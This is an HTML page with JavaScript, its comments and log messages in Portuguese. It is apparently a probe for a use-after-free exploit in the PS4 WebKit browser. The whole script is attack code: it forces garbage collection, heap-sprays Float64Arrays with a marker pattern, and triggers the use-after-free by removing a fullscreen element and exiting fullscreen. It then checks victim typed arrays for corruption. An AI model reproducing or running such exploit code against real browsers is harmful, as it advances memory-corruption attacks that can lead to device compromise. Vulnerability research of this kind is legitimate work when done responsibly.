<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Fullscreen UAF - Memory Probe v1</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Memory Probe v1 (Pre-Crash Observation)</h2>

<button onclick="runProbe()">Run Probe</button>

<pre id="log" style="height:400px;overflow:auto;background:#000;padding:10px;"></pre>

<script>
const PATTERN = 2.121995791e-314; // 0x4141414141414141

function log(msg) {
    console.log(msg);
    document.getElementById("log").textContent += msg + "\n";
}

let victims = {};

function setupVictims() {
    log("[*] Criando objetos vítimas...");

    victims.f64 = new Float64Array(8);
    victims.f64[0] = 13.37;

    victims.u32 = new Uint32Array(16);
    victims.u32[0] = 0x1337;

    victims.buf = new ArrayBuffer(64);
    victims.dv = new DataView(victims.buf);
    victims.dv.setUint32(0, 0xdeadbeef, true);

    window.victims = victims;
}

function setupFullscreen() {
    let fsTarget = document.createElement("div");
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.background = "black";
    fsTarget.innerHTML = "<h1 style='color:white;text-align:center;margin-top:20%'>FULLSCREEN<br>Press OPTIONS</h1>";

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

function doSpray() {
    log("[*] Heap spray iniciado...");

    let spray = [];

    for (let i = 0; i < 10000; i++) {
        let arr = new Float64Array(8);
        arr.fill(PATTERN);
        spray.push(arr);
    }

    return spray;
}

function doGC() {
    log("[*] Forçando GC...");
    for (let i = 0; i < 20000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function checkVictims(stage) {
    log("---- CHECK (" + stage + ") ----");

    try {
        log("[F64] val=" + victims.f64[0]);
    } catch(e) {
        log("[F64 ERROR] " + e);
    }

    try {
        log("[U32] val=" + victims.u32[0]);
    } catch(e) {
        log("[U32 ERROR] " + e);
    }

    try {
        log("[DV] val=" + victims.dv.getUint32(0, true));
    } catch(e) {
        log("[DV ERROR] " + e);
    }

    try {
        log("[META] f64.length=" + victims.f64.length +
            " byteLength=" + victims.f64.byteLength);
    } catch(e) {
        log("[META ERROR] " + e);
    }
}

function trigger(fsTarget) {
    log("[*] Trigger UAF (remove + exitFullscreen)");

    try {
        fsTarget.remove();

        // 🔥 CHECK CRÍTICO — antes do crash
        checkVictims("PRE-EXIT");

        document.webkitExitFullscreen?.();

    } catch(e) {
        log("[TRIGGER ERROR] " + e);
    }

    setTimeout(() => location.reload(), 1000);
}

function runProbe() {
    document.getElementById("log").textContent = "";
    log("[*] Iniciando probe...");

    setupVictims();

    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur recebido");

        // Ordem importante
        doGC();

        let spray = doSpray();

        // Pequeno delay para estabilizar heap
        setTimeout(() => {
            trigger(fsTarget);
        }, 2000);
    };
}
</script>

</body>
</html>
